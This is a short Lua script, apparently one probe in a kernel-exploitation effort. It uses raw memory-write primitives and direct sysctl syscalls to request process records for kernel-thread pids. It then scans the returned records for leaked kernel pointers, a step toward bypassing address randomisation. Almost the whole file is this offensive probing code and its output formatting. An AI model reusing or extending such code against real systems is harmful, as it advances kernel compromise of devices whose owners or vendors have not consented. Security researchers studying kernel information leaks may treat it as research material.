-- CRASH_CLASS: LOW
-- PROBE 1018a: kinfo_proc for the kernel's own pids.
--
-- Every kinfo_proc sweep so far used our own pid, and the result was "sanitised, no
-- kernel pointers". pids 0-4 are kernel threads, whose proc structs live in kernel
-- memory; if sysctl KERN_PROC_PID accepts them, the record is a read of kernel state
-- that a user process normally cannot reach. Scan every qword of each record for a
-- supervisor-range value and print the first three.

print("=== PROBE 1018a: KERNEL PID KINFO ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local m = tostring(x):match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end

local sc_sysctl = mk(202)
local mib = memory.alloc(16); local ma = as_addr(mib)
local buf = memory.alloc(0x800); local ba = as_addr(buf)
local lenp = memory.alloc(8);  local la = as_addr(lenp)

local function one(pid)
    wq(ma, 1); wq(ma+4, 14); wq(ma+8, 1); wq(ma+12, pid)
    for o=0,0x7F8,8 do wq(ba+o, 0x4141414141414141) end
    wq(la, 0x800)   -- *oldlenp must hold the buffer size; it is not a sentinel
    local ok, rv = pcall(function() return sc_sysctl(uint64(ma), uint64(4), uint64(ba), uint64(la), uint64(0), uint64(0)) end)
    if not ok then
        print(string.format("[pid %d] PCALL-FAIL", pid))
        return
    end
    local n = to_num(rv)
    local len = to_num(memory.read_qword(uint64(la)))
    local len_s = (n == 0) and string.format("%d", len) or string.format("%d (unchanged seed - not a written length)", len)
    print(string.format("[pid %d] rv=%d len=%s first=%s %s %s", pid, n, len_s, rq(ba), rq(ba+8), rq(ba+16)))
    if n == 0 and len > 0 then
        local hits = 0
        for o=0,(len<0x800 and len or 0x800)-8,8 do
            local s = rq(ba+o)
            local hi = s:match("^0x(%x+)")
            if hi and #hi >= 9 then
                local top = tonumber(hi:sub(1,#hi-8),16)
                if top and top >= 0xFFFF8000 and top ~= 0xFFFFFFFF then
                    hits = hits + 1
                    if hits <= 3 then print(string.format("    +0x%03X = %s", o, s)) end
                end
            end
        end
        print(string.format("[pid %d] hits=%d", pid, hits))
    end
end

print(string.format("[0] self pid=%u", to_num(mk(20)())))
for _,p in ipairs({0,1,2,3,4,5}) do one(p) end
one(to_num(mk(20)()))
print("=== COMPLETE ===")
